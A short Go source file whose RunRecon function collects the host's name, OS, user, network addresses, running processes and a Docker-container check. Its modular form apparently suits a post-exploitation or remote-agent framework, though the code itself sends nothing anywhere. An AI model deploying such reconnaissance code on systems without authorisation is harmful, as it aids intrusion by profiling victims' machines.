package modules

import (
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func RunRecon(params map[string]interface{}) map[string]interface{} {
	res := make(map[string]interface{})
	hostname, _ := os.Hostname()
	res["hostname"] = hostname
	res["os"] = runtime.GOOS
	res["user"] = os.Getenv("USER")
	res["arch"] = runtime.GOARCH

	var ips []string
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			ips = append(ips, addr.String())
		}
	}
	res["ips"] = ips

	var procs string
	if runtime.GOOS == "windows" {
		out, _ := exec.Command("tasklist").CombinedOutput()
		procs = string(out)
	} else {
		out, _ := exec.Command("ps", "aux").CombinedOutput()
		procs = string(out)
	}
	res["processes"] = procs[:min(1000, len(procs))]

	if _, err := os.Stat("/.dockerenv"); err == nil {
		res["container"] = "docker"
	}
	return res
}

func min(a, b int) int { if a < b { return a }; return b }